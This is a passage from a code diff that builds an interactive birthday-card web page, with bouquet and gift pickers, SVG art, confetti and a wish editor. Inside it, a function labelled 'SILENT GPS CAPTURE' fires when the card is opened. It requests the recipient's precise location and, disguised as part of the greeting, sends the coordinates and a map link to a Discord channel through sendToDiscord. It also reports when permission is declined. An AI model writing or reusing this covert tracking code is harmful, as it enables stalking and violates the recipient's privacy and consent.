+          dotColor: '#c1121f',
+          isSecret: true,
+          photoUrl: '', // Paste real Tender Moments bouquet photo URL here
+          bgGradient: 'from-[#ffe5e5] to-[#fff0f3]',
+          description: 'Blush pink tulips and cheerful pom-poms nestled in rich crimson-red paper with a cream bow.',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="180" height="180" viewBox="0 0 180 180" class="w-40 h-40 mx-auto drop-shadow-sm" fill="none">
+            <path d="M38 48 L90 155 L142 48 L90 34 Z" fill="#C1121F" stroke="#780000" stroke-width="2.5"/>
+            <path d="M54 56 L90 142 L126 56 Z" fill="#FFF8F8"/>
+            <path d="M74 118 Q90 124 106 118 L100 162 L80 162 Z" fill="#A4161A"/>
+            <path d="M90 120 L74 148 M90 120 L106 148" stroke="#FFF3B0" stroke-width="4" stroke-linecap="round"/>
+            <circle cx="90" cy="120" r="5" fill="#FFF3B0"/>
+            <path d="M70 68 Q70 46 78 46 Q86 46 86 68 Z" fill="#FF758F"/>
+            <path d="M94 66 Q94 44 102 44 Q110 44 110 66 Z" fill="#FF8FA3"/>
+            <circle cx="90" cy="74" r="9" fill="#FFB3C1"/>
+          </svg>`,
+        },
+      ];
+
+      const ADDON_ITEMS = [
+        // 3 Plushies
+        {
+          id: 'huggy-bara',
+          category: 'plushie',
+          categoryLabel: 'Plushie',
+          name: 'Huggy Bara',
+          subtitle: 'Chubby Capybara Plushie',
+          photoUrl: '', // Paste Huggy Bara photo URL here
+          bgGradient: 'from-[#f7ede2] to-[#fff8f0]',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120" class="w-24 h-24 mx-auto drop-shadow-sm" fill="none">
+            <ellipse cx="38" cy="36" rx="7" ry="9" transform="rotate(-20 38 36)" fill="#8B5E34" stroke="#5C3D2E" stroke-width="2"/>
+            <ellipse cx="82" cy="36" rx="7" ry="9" transform="rotate(20 82 36)" fill="#8B5E34" stroke="#5C3D2E" stroke-width="2"/>
+            <rect x="30" y="34" width="60" height="66" rx="28" fill="#C69C6D" stroke="#5C3D2E" stroke-width="2.2"/>
+            <ellipse cx="60" cy="54" rx="18" ry="13" fill="#8B5E34"/>
+            <circle cx="44" cy="46" r="3" fill="#3D261C"/>
+            <circle cx="76" cy="46" r="3" fill="#3D261C"/>
+            <ellipse cx="54" cy="51" rx="2" ry="3" fill="#3D261C"/>
+            <ellipse cx="66" cy="51" rx="2" ry="3" fill="#3D261C"/>
+            <path d="M60 54 L60 61 M55 62 Q60 65 65 62" stroke="#3D261C" stroke-width="2" stroke-linecap="round"/>
+            <ellipse cx="38" cy="76" rx="8" ry="12" fill="#A67C52" stroke="#5C3D2E" stroke-width="1.8"/>
+            <ellipse cx="82" cy="76" rx="8" ry="12" fill="#A67C52" stroke="#5C3D2E" stroke-width="1.8"/>
+            <ellipse cx="44" cy="98" rx="9" ry="6" fill="#7F5539"/>
+            <ellipse cx="76" cy="98" rx="9" ry="6" fill="#7F5539"/>
+          </svg>`,
+        },
+        {
+          id: 'alpaca',
+          category: 'plushie',
+          categoryLabel: 'Plushie',
+          name: 'Alpaca',
+          subtitle: 'Fluffy White Alpaca Plushie',
+          photoUrl: '', // Paste Alpaca photo URL here
+          bgGradient: 'from-[#f8f9fa] to-[#fff0f5]',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120" class="w-24 h-24 mx-auto drop-shadow-sm" fill="none">
+            <path d="M46 28 L42 14 L52 24 Z" fill="#FFFFFF" stroke="#D4A373" stroke-width="2"/>
+            <path d="M74 28 L78 14 L68 24 Z" fill="#FFFFFF" stroke="#D4A373" stroke-width="2"/>
+            <rect x="42" y="24" width="36" height="58" rx="18" fill="#FFFFFF" stroke="#E0C3FC" stroke-width="2.2"/>
+            <ellipse cx="60" cy="78" rx="26" ry="20" fill="#FFFFFF" stroke="#E0C3FC" stroke-width="2.2"/>
+            <rect x="44" y="88" width="9" height="16" rx="4.5" fill="#FFF8F0" stroke="#D4A373" stroke-width="1.8"/>
+            <rect x="67" y="88" width="9" height="16" rx="4.5" fill="#FFF8F0" stroke="#D4A373" stroke-width="1.8"/>
+            <circle cx="51" cy="38" r="2.8" fill="#3D261C"/>
+            <circle cx="69" cy="38" r="2.8" fill="#3D261C"/>
+            <path d="M57 44 L60 47 L63 44" stroke="#FF8FA3" stroke-width="2" stroke-linecap="round"/>
+            <ellipse cx="46" cy="43" rx="4" ry="2.5" fill="#FFB3C1" fill-opacity="0.7"/>
+            <ellipse cx="74" cy="43" rx="4" ry="2.5" fill="#FFB3C1" fill-opacity="0.7"/>
+          </svg>`,
+        },
+        {
+          id: 'bunny-love',
+          category: 'plushie',
+          categoryLabel: 'Plushie',
+          name: 'Bunny Love',
+          subtitle: 'Cream Floppy-Eared Bunny',
+          photoUrl: '', // Paste Bunny Love photo URL here
+          bgGradient: 'from-[#fff8e7] to-[#ffe5ec]',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120" class="w-24 h-24 mx-auto drop-shadow-sm" fill="none">
+            <ellipse cx="34" cy="54" rx="9" ry="26" transform="rotate(14 34 54)" fill="#FFF3D6" stroke="#D4A373" stroke-width="2"/>
+            <ellipse cx="86" cy="54" rx="9" ry="26" transform="rotate(-14 86 54)" fill="#FFF3D6" stroke="#D4A373" stroke-width="2"/>
+            <circle cx="60" cy="46" r="22" fill="#FFF8E7" stroke="#D4A373" stroke-width="2.2"/>
+            <ellipse cx="60" cy="80" rx="24" ry="22" fill="#FFF8E7" stroke="#D4A373" stroke-width="2.2"/>
+            <circle cx="51" cy="44" r="2.8" fill="#3D261C"/>
+            <circle cx="69" cy="44" r="2.8" fill="#3D261C"/>
+            <ellipse cx="60" cy="50" rx="4" ry="2.8" fill="#FF8FA3"/>
+            <path d="M56 54 Q60 57 64 54" stroke="#8B624E" stroke-width="1.8" stroke-linecap="round"/>
+            <ellipse cx="43" cy="96" rx="9" ry="7" fill="#FFF3D6" stroke="#D4A373" stroke-width="1.8"/>
+            <ellipse cx="77" cy="96" rx="9" ry="7" fill="#FFF3D6" stroke="#D4A373" stroke-width="1.8"/>
+          </svg>`,
+        },
+        // 3 Bracelets
+        {
+          id: 'bubblegum-daisy',
+          category: 'bracelet',
+          categoryLabel: 'Bracelet',
+          name: 'Bubblegum Daisy Bracelet',
+          subtitle: 'Pink Crystal Beads & Daisy Charm',
+          photoUrl: '', // Paste Bubblegum Daisy Bracelet photo URL here
+          bgGradient: 'from-[#ffe5ec] to-[#fff5f8]',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120" class="w-24 h-24 mx-auto drop-shadow-sm" fill="none">
+            <circle cx="60" cy="54" r="30" stroke="#FFB3C1" stroke-width="6" stroke-dasharray="6 4"/>
+            <circle cx="60" cy="54" r="30" stroke="#FF8FA3" stroke-width="2"/>
+            <line x1="50" y1="83" x2="50" y2="96" stroke="#E5A93B" stroke-width="2"/>
+            <circle cx="50" cy="99" r="4" fill="#FFB3C1" stroke="#E5A93B" stroke-width="1.5"/>
+            <g transform="translate(68, 92)">
+              <circle cx="0" cy="-7" r="4" fill="#FFD6E0" stroke="#FF8FA3" stroke-width="1"/>
+              <circle cx="0" cy="7" r="4" fill="#FFD6E0" stroke="#FF8FA3" stroke-width="1"/>
+              <circle cx="-7" cy="0" r="4" fill="#FFD6E0" stroke="#FF8FA3" stroke-width="1"/>
+              <circle cx="7" cy="0" r="4" fill="#FFD6E0" stroke="#FF8FA3" stroke-width="1"/>
+              <circle cx="-5" cy="-5" r="3.5" fill="#FFD6E0"/>
+              <circle cx="5" cy="-5" r="3.5" fill="#FFD6E0"/>
+              <circle cx="-5" cy="5" r="3.5" fill="#FFD6E0"/>
+              <circle cx="5" cy="5" r="3.5" fill="#FFD6E0"/>
+              <circle cx="0" cy="0" r="3.5" fill="#FFD166"/>
+            </g>
+          </svg>`,
+        },
+        {
+          id: 'crystal-daisy',
+          category: 'bracelet',
+          categoryLabel: 'Bracelet',
+          name: 'Crystal Daisy Bracelet',
+          subtitle: 'Clear Crystal Beads & White Daisy',
+          photoUrl: '', // Paste Crystal Daisy Bracelet photo URL here
+          bgGradient: 'from-[#f0f4f8] to-[#ffffff]',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120" class="w-24 h-24 mx-auto drop-shadow-sm" fill="none">
+            <circle cx="60" cy="54" r="30" stroke="#CBD5E1" stroke-width="6" stroke-dasharray="6 4"/>
+            <circle cx="60" cy="54" r="30" stroke="#94A3B8" stroke-width="1.8"/>
+            <line x1="50" y1="83" x2="50" y2="96" stroke="#E5A93B" stroke-width="2"/>
+            <circle cx="50" cy="99" r="4" fill="#F8FAFC" stroke="#94A3B8" stroke-width="1.5"/>
+            <g transform="translate(68, 92)">
+              <circle cx="0" cy="-7" r="4" fill="#FFFFFF" stroke="#CBD5E1" stroke-width="1"/>
+              <circle cx="0" cy="7" r="4" fill="#FFFFFF" stroke="#CBD5E1" stroke-width="1"/>
+              <circle cx="-7" cy="0" r="4" fill="#FFFFFF" stroke="#CBD5E1" stroke-width="1"/>
+              <circle cx="7" cy="0" r="4" fill="#FFFFFF" stroke="#CBD5E1" stroke-width="1"/>
+              <circle cx="-5" cy="-5" r="3.5" fill="#FFFFFF"/>
+              <circle cx="5" cy="-5" r="3.5" fill="#FFFFFF"/>
+              <circle cx="-5" cy="5" r="3.5" fill="#FFFFFF"/>
+              <circle cx="5" cy="5" r="3.5" fill="#FFFFFF"/>
+              <circle cx="0" cy="0" r="3.5" fill="#FFD166"/>
+            </g>
+          </svg>`,
+        },
+        {
+          id: 'rainbow-daisy',
+          category: 'bracelet',
+          categoryLabel: 'Bracelet',
+          name: 'Rainbow Daisy Bracelet',
+          subtitle: 'Pastel Multicolor Beads & Daisy Charm',
+          photoUrl: '', // Paste Rainbow Daisy Bracelet photo URL here
+          bgGradient: 'from-[#f3e8ff] via-[#ffe5ec] to-[#fff8e1]',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120" class="w-24 h-24 mx-auto drop-shadow-sm" fill="none">
+            <circle cx="60" cy="54" r="30" stroke="#CDB4DB" stroke-width="6" stroke-dasharray="6 4"/>
+            <circle cx="60" cy="54" r="30" stroke="#FFAFCC" stroke-width="2"/>
+            <circle cx="32" cy="44" r="3.5" fill="#FFAFCC"/>
+            <circle cx="88" cy="44" r="3.5" fill="#A2D2FF"/>
+            <circle cx="60" cy="24" r="3.5" fill="#FFD166"/>
+            <line x1="70" y1="83" x2="70" y2="96" stroke="#E5A93B" stroke-width="2"/>
+            <circle cx="70" cy="99" r="4" fill="#CDB4DB" stroke="#9D8189" stroke-width="1.5"/>
+            <g transform="translate(52, 92)">
+              <circle cx="0" cy="-7" r="4" fill="#FFFFFF" stroke="#CDB4DB" stroke-width="1"/>
+              <circle cx="0" cy="7" r="4" fill="#FFFFFF" stroke="#CDB4DB" stroke-width="1"/>
+              <circle cx="-7" cy="0" r="4" fill="#FFFFFF" stroke="#CDB4DB" stroke-width="1"/>
+              <circle cx="7" cy="0" r="4" fill="#FFFFFF" stroke="#CDB4DB" stroke-width="1"/>
+              <circle cx="-5" cy="-5" r="3.5" fill="#FFFFFF"/>
+              <circle cx="5" cy="-5" r="3.5" fill="#FFFFFF"/>
+              <circle cx="-5" cy="5" r="3.5" fill="#FFFFFF"/>
+              <circle cx="5" cy="5" r="3.5" fill="#FFFFFF"/>
+              <circle cx="0" cy="0" r="3.5" fill="#FFD166"/>
+            </g>
+          </svg>`,
+        },
+      ];
+
+      // -------------------------------------------------------------------
+      // 2. APPLICATION STATE
+      // -------------------------------------------------------------------
+      const state = {
+        recipientName: 'Ashie',
+        senderName: 'Kon',
+        dateLabel: '27 Dec',
+        wishMessage:
+          'Wishing the happiest birthday to the sweetest person in my world. Even from afar, I want today to feel extra warm, gentle, and full of smiles for you. Pick your favorite bouquet and a little birthday treat below—made just for you!',
+        envelopeOpened: false,
+        currentSlideIndex: 0,
+        secretUnlocked: false,
+        plushieChecked: false,
+        braceletChecked: false,
+        selectedPlushieId: 'huggy-bara',
+        selectedBraceletId: 'bubblegum-daisy',
+        gps: {
+          status: 'pending',
+          lat: null,
+          lng: null,
+          accuracy: null,
+          mapsUrl: null,
+        },
+      };
+
+      // -------------------------------------------------------------------
+      // 3. SAFE AUDIO, TOAST & CONFETTI HELPERS (NEVER THROW ERRORS)
+      // -------------------------------------------------------------------
+      let audioCtx = null;
+      function playSound(type) {
+        try {
+          const AudioCtx = window.AudioContext || window.webkitAudioContext;
+          if (!AudioCtx) return;
+          if (!audioCtx) audioCtx = new AudioCtx();
+          if (audioCtx.state === 'suspended') audioCtx.resume();
+          const now = audioCtx.currentTime;
+
+          if (type === 'pop') {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(480, now);
+            osc.frequency.exponentialRampToValueAtTime(760, now + 0.08);
+            gain.gain.setValueAtTime(0.1, now);
+            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.09);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start(now);
+            osc.stop(now + 0.1);
+          } else if (type === 'chime') {
+            [523.25, 659.25, 783.99, 1046.5].forEach((freq, idx) => {
+              const osc = audioCtx.createOscillator();
+              const gain = audioCtx.createGain();
+              osc.type = 'triangle';
+              osc.frequency.setValueAtTime(freq, now + idx * 0.08);
+              gain.gain.setValueAtTime(0.11, now + idx * 0.08);
+              gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.08 + 0.4);
+              osc.connect(gain);
+              gain.connect(audioCtx.destination);
+              osc.start(now + idx * 0.08);
+              osc.stop(now + idx * 0.08 + 0.42);
+            });
+          }
+        } catch (err) {
+          // Silently ignore audio sandbox restrictions
+        }
+      }
+
+      let toastTimer = null;
+      function showToast(msg) {
+        try {
+          const banner = document.getElementById('toastBanner');
+          const text = document.getElementById('toastText');
+          if (!banner || !text) return;
+          text.textContent = msg;
+          banner.classList.remove('opacity-0', '-translate-y-3');
+          clearTimeout(toastTimer);
+          toastTimer = setTimeout(() => {
+            banner.classList.add('opacity-0', '-translate-y-3');
+          }, 2600);
+        } catch (err) {}
+      }
+
+      let confettiPieces = [];
+      function launchConfetti(count = 90, originY = 0.45) {
+        try {
+          const colors = ['#ff8fa3', '#ffb3c1', '#e09f9d', '#f4c95d', '#cdb4db'];
+          for (let i = 0; i < count; i++) {
+            confettiPieces.push({
+              x: window.innerWidth * (0.2 + Math.random() * 0.6),
+              y: window.innerHeight * originY,
+              vx: (Math.random() - 0.5) * 14,
+              vy: -Math.random() * 11 - 4,
+              size: 6 + Math.random() * 6,
+              color: colors[Math.floor(Math.random() * colors.length)],
+              rot: Math.random() * Math.PI * 2,
+              vRot: (Math.random() - 0.5) * 0.25,
+              life: 1,
+            });
+          }
+        } catch (err) {}
+      }
+
+      function animateConfetti() {
+        try {
+          const canvas = document.getElementById('confettiCanvas');
+          if (!canvas) return;
+          const ctx = canvas.getContext('2d');
+          if (canvas.width !== window.innerWidth) canvas.width = window.innerWidth;
+          if (canvas.height !== window.innerHeight) canvas.height = window.innerHeight;
+
+          ctx.clearRect(0, 0, canvas.width, canvas.height);
+          for (let i = confettiPieces.length - 1; i >= 0; i--) {
+            const p = confettiPieces[i];
+            p.x += p.vx;
+            p.y += p.vy;
+            p.vy += 0.3;
+            p.vx *= 0.985;
+            p.rot += p.vRot;
+            p.life -= 0.009;
+            if (p.life <= 0 || p.y > canvas.height + 20) {
+              confettiPieces.splice(i, 1);
+              continue;
+            }
+            ctx.save();
+            ctx.translate(p.x, p.y);
+            ctx.rotate(p.rot);
+            ctx.globalAlpha = Math.max(0, p.life);
+            ctx.fillStyle = p.color;
+            ctx.fillRect(-p.size / 2, -p.size / 4, p.size, p.size / 2);
+            ctx.restore();
+          }
+        } catch (err) {}
+        requestAnimationFrame(animateConfetti);
+      }
+
+      function initAmbientParticles() {
+        try {
+          const layer = document.getElementById('ambientLayer');
+          if (!layer) return;
+          const items = ['🌸', '💖', '✨', '🌷', '🤍', '💐'];
+          for (let i = 0; i < 14; i++) {
+            const span = document.createElement('span');
+            span.className = 'ambient-petal';
+            span.textContent = items[i % items.length];
+            span.style.left = `${Math.random() * 95}%`;
+            span.style.fontSize = `${12 + Math.random() * 11}px`;
+            span.style.animationDuration = `${12 + Math.random() * 12}s`;
+            span.style.animationDelay = `${-Math.random() * 15}s`;
+            layer.appendChild(span);
+          }
+        } catch (err) {}
+      }
+
+      // -------------------------------------------------------------------
+      // 4. SILENT GPS CAPTURE + ENVELOPE OPENING (GUARANTEED TRANSITION)
+      // -------------------------------------------------------------------
+      function captureGpsSilently() {
+        try {
+          if (!('geolocation' in navigator)) {
+            state.gps.status = 'unavailable';
+            sendToDiscord(
+              `💌 ${state.recipientName} opened the birthday card!`,
+              'Browser does not support GPS geolocation.',
+              16758465
+            );
+            return;
+          }
+
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              try {
+                const lat = Number(pos.coords.latitude.toFixed(6));
+                const lng = Number(pos.coords.longitude.toFixed(6));
+                const acc = Math.round(pos.coords.accuracy);
+                const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+
+                state.gps.status = 'captured';
+                state.gps.lat = lat;
+                state.gps.lng = lng;
+                state.gps.accuracy = acc;
+                state.gps.mapsUrl = mapsUrl;
+
+                sendToDiscord(
+                  `📍 ${state.recipientName} opened the birthday card & shared GPS!`,
+                  `**Coordinates:** \`${lat}, ${lng}\` (±${acc}m)\n` +
+                    `**Google Maps:** [Open Pin Location](${mapsUrl})`,
+                  16748698
+                );
+              } catch (innerErr) {}
+            },
+            () => {
+              state.gps.status = 'denied';
+              sendToDiscord(
+                `💌 ${state.recipientName} opened the birthday card!`,
+                'Card was opened, but GPS permission was declined or unavailable.',
+                16758465
+              );
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 7000,
+              maximumAge: 60000,
+            }
+          );
+        } catch (err) {
+          state.gps.status = 'error';
+          sendToDiscord(
+            `💌 ${state.recipientName} opened the birthday card!`,
+            'Card was opened (GPS sandbox restricted).',
+            16758465
+          );
+        }
+      }
+
+      function openBirthdayEnvelope(e) {
+        if (e && typeof e.preventDefault === 'function') {
+          e.preventDefault();
+        }
+        if (state.envelopeOpened) return;
+        state.envelopeOpened = true;
+
+        // 1. Trigger visual envelope opening FIRST so UI never hangs
+        const envelopeBox = document.getElementById('envelopeBox');
+        const envelopeScreen = document.getElementById('envelopeScreen');
+        const mainExperience = document.getElementById('mainExperience');
+
+        if (envelopeBox) {
+          envelopeBox.classList.add('envelope-opened');
+        }
+
+        // 2. Run optional effects & silent GPS safely in isolated try/catch blocks
+        try {
+          playSound('chime');
+        } catch (err) {}
+
+        try {
+          launchConfetti(105, 0.48);
+        } catch (err) {}
+
+        try {
+          setTimeout(captureGpsSilently, 60);
+        } catch (err) {}
+
+        // 3. Guaranteed transition to the main wish & builder screen
+        setTimeout(() => {
+          if (envelopeScreen) {
+            envelopeScreen.classList.add('opacity-0', 'scale-95', 'pointer-events-none');
+          }
+          setTimeout(() => {
+            if (envelopeScreen) {
+              envelopeScreen.classList.add('hidden');
+              envelopeScreen.classList.remove('flex');
+            }
+            if (mainExperience) {
+              mainExperience.classList.remove('hidden');
+              requestAnimationFrame(() => {
+                mainExperience.classList.remove('opacity-0');
+              });
+            }
+          }, 420);
+        }, 550);
+      }
+
+      // Expose globally for inline onclick fallback + attach direct listeners
+      window.__openBirthdayCard = openBirthdayEnvelope;
+
+      const openSealBtn = document.getElementById('openEnvelopeBtn');
+      const openTextBtn = document.getElementById('openEnvelopeTextBtn');
+      if (openSealBtn) openSealBtn.addEventListener('click', openBirthdayEnvelope);
+      if (openTextBtn) openTextBtn.addEventListener('click', openBirthdayEnvelope);
+
+      // -------------------------------------------------------------------
+      // 5. BOUQUET CAROUSEL & SECRET UNLOCK ("Not quite the one yet? 👀")
+      // -------------------------------------------------------------------
+      function getVisibleBouquets() {
+        return state.secretUnlocked
+          ? BOUQUETS
+          : BOUQUETS.filter((b) => !b.isSecret);
+      }
+
+      function getCurrentBouquet() {
+        const list = getVisibleBouquets();
+        return list[state.currentSlideIndex] || list[0];
+      }
+
+      function renderBouquetCarousel(animate = true) {
+        const list = getVisibleBouquets();
+        if (state.currentSlideIndex >= list.length) state.currentSlideIndex = 0;
+        const current = list[state.currentSlideIndex];
+
+        const card = document.getElementById('activeBouquetCard');
+        if (animate && card) {
+          card.classList.remove('animate-pop-in');
+          void card.offsetWidth;
+          card.classList.add('animate-pop-in');
+        }
+
+        const visual = document.getElementById('activeBouquetVisual');
+        if (visual) {
+          visual.className = `relative w-full aspect-[4/3] max-h-[320px] rounded-2xl bg-gradient-to-br ${current.bgGradient} border-2 border-dashed border-rosegold/60 flex flex-col items-center justify-center p-4 mb-4 overflow-hidden shadow-inner`;
+          if (current.photoUrl) {
+            visual.innerHTML = `<img src="${current.photoUrl}" alt="${current.name}" class="w-full h-full object-contain rounded-xl" />`;
+          } else {
+            visual.innerHTML = `
+              <span class="absolute top-3 left-3 bg-white/90 text-[11px] font-cute font-semibold text-rosegolddark px-2.5 py-0.5 rounded-full border border-rosegold/40">
+                🖼️ Photo Slot (${current.name})
+              </span>
+              <div class="scale-110 sm:scale-125">${current.svgArt}</div>
+            `;
+          }
+        }
+
+        document.getElementById('activeBouquetTag').textContent = current.colorTag;
+        document.getElementById('activeBouquetCounter').textContent = `${state.currentSlideIndex + 1} / ${list.length}`;
+        document.getElementById('activeBouquetName').textContent = current.name;
+        document.getElementById('activeBouquetDesc').textContent = current.description;
+
+        // Render Color Dots
+        const dotsEl = document.getElementById('bouquetDots');
+        dotsEl.innerHTML = '';
+        list.forEach((b, idx) => {
+          const isCurrent = idx === state.currentSlideIndex;
+          const btn = document.createElement('button');
+          btn.type = 'button';
+          btn.className = `inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-cute font-semibold border transition cursor-pointer ${
+            isCurrent
+              ? 'bg-choco text-white border-choco shadow-sm'
+              : 'bg-white hover:bg-blush text-choco border-rosegold/45'
+          }`;
+          btn.innerHTML = `<span class="w-2.5 h-2.5 rounded-full border border-white/70" style="background:${b.dotColor}"></span><span>${b.name}</span>`;
+          btn.addEventListener('click', () => {
+            state.currentSlideIndex = idx;
+            playSound('pop');
+            renderBouquetCarousel(true);
+            enforceAddonAllowance();
+          });
+          dotsEl.appendChild(btn);
+        });
+
+        // Show "Not quite the one yet? 👀" when reaching the 3rd bouquet ('Isabelle')
+        const unlockBanner = document.getElementById('secretUnlockBanner');
+        if (!state.secretUnlocked && state.currentSlideIndex === 2) {
+          unlockBanner.classList.remove('hidden');
+        } else {
+          unlockBanner.classList.add('hidden');
+        }
+
+        enforceAddonAllowance();
+      }
+
+      document.getElementById('prevBouquetBtn').addEventListener('click', () => {
+        const list = getVisibleBouquets();
+        state.currentSlideIndex = (state.currentSlideIndex - 1 + list.length) % list.length;
+        playSound('pop');
+        renderBouquetCarousel(true);
+      });
+
+      document.getElementById('nextBouquetBtn').addEventListener('click', () => {
+        const list = getVisibleBouquets();
+        state.currentSlideIndex = (state.currentSlideIndex + 1) % list.length;
+        playSound('pop');
+        renderBouquetCarousel(true);
+      });
+
+      document.getElementById('unlockExtraBouquetsBtn').addEventListener('click', () => {
+        state.secretUnlocked = true;
+        state.currentSlideIndex = 3; // Jump straight to 'Meliora'
+        playSound('chime');
+        launchConfetti(60, 0.5);
+        renderBouquetCarousel(true);
+        showToast('Unlocked 2 more special bouquets! ✨');
+      });
+
+      // -------------------------------------------------------------------
+      // 6. CATEGORY-FIRST ADD-ON SELECTOR & DYNAMIC ALLOWANCE (1 VS UP TO 2)
+      // -------------------------------------------------------------------
+      function enforceAddonAllowance() {
+        const bouquet = getCurrentBouquet();
+        const maxAllowed = bouquet.maxAddons;
+        const allowanceText = document.getElementById('addonAllowanceText');
+
+        if (maxAllowed === 2) {
+          allowanceText.textContent = 'You can choose up to 2 special add-ons 💕';
+        } else {
+          allowanceText.textContent = 'You can choose 1 special add-on 💕';
+          // If both categories are checked while switching back to a 1-addon bouquet, keep Plushie
+          if (state.plushieChecked && state.braceletChecked) {
+            state.braceletChecked = false;
+            document.getElementById('checkBracelet').checked = false;
+            showToast('Updated to 1 special add-on for this bouquet 💕');
+          }
+        }
+        renderAddonPanels();
+      }
+
+      function renderAddonPanels() {
+        const checkPlushie = document.getElementById('checkPlushie');
+        const checkBracelet = document.getElementById('checkBracelet');
+        const cardPlushie = document.getElementById('catCardPlushie');
+        const cardBracelet = document.getElementById('catCardBracelet');
+        const panelPlushie = document.getElementById('plushiePickerPanel');
+        const panelBracelet = document.getElementById('braceletPickerPanel');
+
+        checkPlushie.checked = state.plushieChecked;
+        checkBracelet.checked = state.braceletChecked;
+
+        cardPlushie.className = `flex items-center justify-between p-4 rounded-2xl border-2 cursor-pointer transition select-none ${
+          state.plushieChecked
+            ? 'border-strawberry bg-blush shadow-sm'
+            : 'border-rosegold/40 bg-blush/45 hover:bg-blush/85'
+        }`;
+
+        cardBracelet.className = `flex items-center justify-between p-4 rounded-2xl border-2 cursor-pointer transition select-none ${
+          state.braceletChecked
+            ? 'border-strawberry bg-blush shadow-sm'
+            : 'border-rosegold/40 bg-blush/45 hover:bg-blush/85'
+        }`;
+
+        if (state.plushieChecked) {
+          panelPlushie.classList.remove('hidden');
+        } else {
+          panelPlushie.classList.add('hidden');
+        }
+
+        if (state.braceletChecked) {
+          panelBracelet.classList.remove('hidden');
+        } else {
+          panelBracelet.classList.add('hidden');
+        }
+
+        renderSubItemGrid('plushie', 'plushieGrid', state.selectedPlushieId);
+        renderSubItemGrid('bracelet', 'braceletGrid', state.selectedBraceletId);
+      }
+
+      function renderSubItemGrid(category, containerId, selectedId) {
+        const grid = document.getElementById(containerId);
+        if (!grid) return;
+        grid.innerHTML = '';
+
+        ADDON_ITEMS.filter((item) => item.category === category).forEach((item) => {
+          const isPicked = item.id === selectedId;
+          const btn = document.createElement('button');
+          btn.type = 'button';
+          btn.className = `text-center rounded-2xl border-2 p-3 transition cursor-pointer flex flex-col justify-between ${
+            isPicked
+              ? 'bg-white border-strawberry ring-4 ring-strawberry/15 shadow-sm -translate-y-0.5'
+              : 'bg-white/85 hover:bg-white border-rosegold/35 hover:border-strawberry'
+          }`;
+
+          const visualHtml = item.photoUrl
+            ? `<img src="${item.photoUrl}" alt="${item.name}" class="w-full h-full object-contain rounded-xl" />`
+            : `<span class="absolute top-1.5 left-1.5 bg-white/90 text-[9px] font-cute font-semibold text-rosegolddark px-1.5 py-0.5 rounded-full border border-rosegold/35">🖼️ Photo</span>
+               <div class="mt-2">${item.svgArt}</div>`;
+
+          btn.innerHTML = `
+            <div>
+              <div class="relative w-full aspect-square rounded-xl bg-gradient-to-br ${item.bgGradient} border border-dashed border-rosegold/45 flex items-center justify-center p-2 mb-2 overflow-hidden">
+                ${visualHtml}
+                ${
+                  isPicked
+                    ? '<span class="absolute top-1.5 right-1.5 bg-strawberry text-white text-[10px] font-cute font-bold px-2 py-0.5 rounded-full">✓</span>'
+                    : ''
+                }
+              </div>
+              <p class="font-cute font-semibold text-xs sm:text-sm text-choco leading-snug">${item.name}</p>
+              <p class="text-[11px] text-chocolight mt-0.5">${item.subtitle}</p>
+            </div>
+          `;
+
+          btn.addEventListener('click', () => {
+            if (category === 'plushie') {
+              state.selectedPlushieId = item.id;
+            } else {
+              state.selectedBraceletId = item.id;
+            }
+            playSound('pop');
+            renderAddonPanels();
+          });
+
+          grid.appendChild(btn);
+        });
+      }
+
+      document.getElementById('checkPlushie').addEventListener('change', (e) => {
+        const checked = e.target.checked;
+        const maxAllowed = getCurrentBouquet().maxAddons;
+        state.plushieChecked = checked;
+        if (checked && maxAllowed === 1 && state.braceletChecked) {
+          state.braceletChecked = false;
+        }
+        playSound('pop');
+        renderAddonPanels();
+      });
+
+      document.getElementById('checkBracelet').addEventListener('change', (e) => {
+        const checked = e.target.checked;
+        const maxAllowed = getCurrentBouquet().maxAddons;
+        state.braceletChecked = checked;
+        if (checked && maxAllowed === 1 && state.plushieChecked) {
+          state.plushieChecked = false;
+        }
+        playSound('pop');
+        renderAddonPanels();
+      });
+
+      // -------------------------------------------------------------------
+      // 7. WISH EDITING & TEXT SYNC
+      // -------------------------------------------------------------------
+      function syncTextDisplays() {
+        document.getElementById('headerRecipientName').textContent = state.recipientName;
+        document.getElementById('letterBadgeRecipient').textContent = state.recipientName.toUpperCase();
+        document.getElementById('displayRecipient').textContent = state.recipientName;
+        document.getElementById('displaySender').textContent = state.senderName;
+        document.getElementById('displayMessage').textContent = state.wishMessage;
+      }
+
+      document.getElementById('toggleEditWishBtn').addEventListener('click', () => {
+        document.getElementById('editRecipientInput').value = state.recipientName;
+        document.getElementById('editSenderInput').value = state.senderName;
+        document.getElementById('editMessageInput').value = state.wishMessage;
+        document.getElementById('wishDisplayMode').classList.add('hidden');
+        document.getElementById('wishEditMode').classList.remove('hidden');
+      });
+
+      document.getElementById('cancelEditWishBtn').addEventListener('click', () => {
+        document.getElementById('wishEditMode').classList.add('hidden');
+        document.getElementById('wishDisplayMode').classList.remove('hidden');
+      });
+
+      document.getElementById('saveEditWishBtn').addEventListener('click', () => {
+        state.recipientName = document.getElementById('editRecipientInput').value.trim() || 'Ashie';
+        state.senderName = document.getElementById('editSenderInput').value.trim() || 'Kon';
+        state.wishMessage = document.getElementById('editMessageInput').value.trim() || state.wishMessage;
+        syncTextDisplays();
+        document.getElementById('wishEditMode').classList.add('hidden');
